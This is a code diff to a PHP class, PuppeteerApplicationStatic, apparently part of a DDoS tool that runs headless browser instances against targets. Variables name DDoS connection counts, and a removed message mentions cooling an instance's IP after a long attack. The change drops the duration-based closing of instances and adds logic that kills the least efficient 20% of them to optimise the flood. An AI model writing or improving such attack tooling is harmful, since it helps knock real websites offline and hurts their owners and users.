@@ -63,7 +63,7 @@ abstract class PuppeteerApplicationStatic extends HackApplication
         static::createTempWorkingDirectory();
         Actions::addAction('AfterCleanTempDir',               [static::class, 'createTempWorkingDirectory']);
 
-        Actions::addAction('BeforeMainOutputLoop',            [static::class, 'closeInstances']);
+        Actions::addAction('BeforeMainOutputLoopIteration',   [static::class, 'actionBeforeMainOutputLoopIteration']);
         Actions::addFilter('KillZombieProcesses',             [static::class, 'filterKillZombieProcesses']);
 
         Actions::addAction('BeforeTerminateFinalSession',     [static::class, 'terminateInstances']);
@@ -187,7 +187,7 @@ abstract class PuppeteerApplicationStatic extends HackApplication
         $correctionPercent   = $resourcesCorrection['percent'] ?? false;
 
         if ($correctionPercent) {
-            $runningInstances = static::sortInstancesArrayByExecutionTime(static::getRunningInstances(), false);
+            $runningInstances = static::sortInstancesArrayByEfficiencyLevel(static::getRunningInstances());
             $runningInstancesCount = count($runningInstances);
 
             $previousSessionPuppeteerDdosConnectionsCount = $PUPPETEER_DDOS_CONNECTIONS_COUNT_INT;
@@ -432,7 +432,7 @@ abstract class PuppeteerApplicationStatic extends HackApplication
         return $value;
     }
 
-    public static function closeInstances()
+    /*public static function closeInstances()
     {
         global $CURRENT_SESSION_DURATION, $ONE_SESSION_MAX_DURATION;
 
@@ -446,6 +446,24 @@ abstract class PuppeteerApplicationStatic extends HackApplication
             } else if ($networkStats->total->duration > rand(2 * $ONE_SESSION_MAX_DURATION, 4 * $ONE_SESSION_MAX_DURATION)) {
                 $puppeteerApplication->requireTerminate('The attack lasts ' . intRound($networkStats->total->duration / 60) . " minutes. Close this connection to cool it's IP");
             }
+        }
+    }*/
+
+    public static function actionBeforeMainOutputLoopIteration()
+    {
+        global $MAIN_OUTPUT_LOOP_LAST_ITERATION;
+
+        if (!$MAIN_OUTPUT_LOOP_LAST_ITERATION) {
+            return;
+        }
+
+        $runningInstances = static::sortInstancesArrayByEfficiencyLevel(static::getRunningInstances());
+        $runningInstancesCount = count($runningInstances);
+        $weakestInstancesCount = intRound($runningInstancesCount * 0.2);
+
+        for ($i = 0; $i < $weakestInstancesCount; $i++) {
+            $puppeteerApplication = $runningInstances[$i];
+            $puppeteerApplication->requireTerminate('Weak instance');
         }
     }
 
